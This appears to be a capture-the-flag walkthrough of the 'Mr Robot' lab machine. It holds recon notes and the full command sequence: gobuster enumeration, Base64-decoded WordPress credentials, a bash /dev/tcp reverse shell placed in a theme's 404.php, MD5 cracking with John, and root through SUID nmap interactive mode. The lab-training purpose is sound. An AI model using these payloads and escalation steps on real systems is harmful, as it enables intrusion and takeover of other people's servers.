# Mr Robot CTF - Recon

Target: 10.112.137.36

## Nmap

- Open ports:
  - `22/tcp` → SSH
  - `80/tcp` → HTTP
  - `443/tcp` → HTTPS

- Services:
  - `22/tcp` → OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
  - `80/tcp` → Apache httpd
  - `443/tcp` → Apache httpd with SSL
  - Detected OS: Linux / Ubuntu

- Notes:
  - The site exposes a web application over HTTP and HTTPS.
  - The SSH port is open, but initially we do not have credentials to access it.
  - The main attack surface to analyze is the web service.
  - Nmap does not show useful titles: `Site doesn't have a title`.

## Web

- Homepage:
  - URL: `http://10.112.137.36`
  - The site responds correctly over HTTP.
  - Based on the discovered structure, it appears to be a WordPress site.
  - Typical WordPress paths are present:
    - `/wp-admin`
    - `/wp-content`
    - `/wp-includes`
    - `/wp-login`
    - `/wp-login.php`

- robots.txt:
  - URL: `http://10.112.137.36/robots.txt`
  - Status: `200`
  - Interesting file because it contains hidden resources.
  - Findings:
    - `fsocity.dic`
    - `key-1-of-3.txt`

- Interesting directories:
  - `/admin` → redirect
  - `/dashboard` → redirect to `/wp-admin/`
  - `/login` → redirect to `/wp-login.php`
  - `/wp-admin` → WordPress admin area
  - `/wp-login` → WordPress login
  - `/wp-content` → WordPress content directory
  - `/wp-includes` → WordPress core directory
  - `/license` → interesting file with hidden/Base64 text
  - `/readme` → informational file
  - `/phpmyadmin` → `403 Forbidden`, exists but is not accessible
  - `/xmlrpc.php` → `405 Method Not Allowed`, WordPress endpoint present
  - `/intro` → large file, video
  - `/audio` → directory
  - `/images` → directory
  - `/video` → directory
  - `/js` → directory
  - `/css` → directory

- Found files:
  - `/robots.txt`
  - `/fsocity.dic`
  - `/key-1-of-3.txt`
  - `/license`
  - `/readme`
  - `/index.html`
  - `/wp-login.php`
  - `/xmlrpc.php`

- WordPress?
  - Yes, the site is WordPress.
  - Confirmed by:
    - `/wp-admin`
    - `/wp-login.php`
    - `/wp-content`
    - `/wp-includes`

- Login?
  - WordPress login found at:
    - `http://10.112.137.36/wp-login.php`
  - Credentials found in the `/license` file through Base64 decoding:
    - username: `elliot`
    - password: `ER28-0652`
  - WordPress access succeeded as `elliot`.

- Wordlist?
  - Wordlist found through `robots.txt`:
    - `fsocity.dic`
  - Commands used:
    ```bash
    wget http://10.112.137.36/fsocity.dic -O loot/fsocity.dic
    sort -u loot/fsocity.dic -o loot/fsocity_unique.dic
    ```

- Downloaded files?
  - `fsocity.dic`
  - `key-1-of-3.txt`
  - `license.txt`
  - `robots.txt`

- Next technical steps:
  - Use WordPress access to modify a PHP file from the theme.
  - Insert a reverse shell into `404.php`.
  - Get a shell as the `daemon` user.
  - Enumerate `/home/robot`.
  - Read `password.raw-md5`.
  - Crack the MD5 hash with John.
  - Use `su robot`.
  - Read `key-2-of-3.txt`.
  - Search for SUID binaries.
  - Abuse `/usr/local/bin/nmap --interactive`.
  - Get root.
  - Read `/root/key-3-of-3.txt`.


1. Nmap scan
2. Web enumeration
3. robots.tx
4. key1 + fsocity.dic
5. /license
6. Base64 decode
7. WordPress login as elliot
8. Modify 404.php
9. Reverse shell as daemon
10. /home/robot
11. Read password.raw-md5
12. Crack MD5 with John
13. su robot
14. Read key2
15. Find SUID binaries
16. Abuse nmap interactive mode
17. Root
18. Read key3


### COMMAND

## Setup
```
export TARGET=10.112.137.36
mkdir -p ~/thm/mrrobot/{scans,loot,notes}
cd ~/thm/mrrobot
```
## Recon
```
nmap -sC -sV -oN scans/initial.txt $TARGET
```
## Directory enumeration
```
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -o scans/gobuster_ext.txt
```
## robots.txt
```
curl -s http://$TARGET/robots.txt | tee notes/robots.txt
wget http://$TARGET/fsocity.dic -O loot/fsocity.dic
wget http://$TARGET/key-1-of-3.txt -O loot/key-1-of-3.txt
cat loot/key-1-of-3.txt
```
## Clean wordlist
```
sort -u loot/fsocity.dic -o loot/fsocity_unique.dic
```
## license
```
curl -s http://$TARGET/license | tee notes/license.txt
grep -Eo '[A-Za-z0-9+/=]{20,}' notes/license.txt
echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
```
## Listener
```
ip addr show tun0
nc -lvnp 4444
```
## Reverse shell payload in 404.php
```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_TUN0_IP/4444 0>&1'");
?>
```
## Stabilize shell
```
whoami
id
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```
## Robot user
```
cd /home/robot
ls -la
cat password.raw-md5
```
## Crack hash
```
echo 'c3fcd3d76192e4007dfb496cca67e13b' > loot/robot_hash.txt
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt loot/robot_hash.txt
john --show --format=Raw-MD5 loot/robot_hash.txt
```
## Switch user
```
su robot
whoami
cat /home/robot/key-2-of-3.txt
```
## Privilege escalation
```
find / -perm -4000 -type f 2>/dev/null
ls -la /usr/local/bin/nmap
/usr/local/bin/nmap --interactive
```
## Inside nmap
```
!sh
```
## Root
```
whoami
id
cat /root/key-3-of-3.txt
```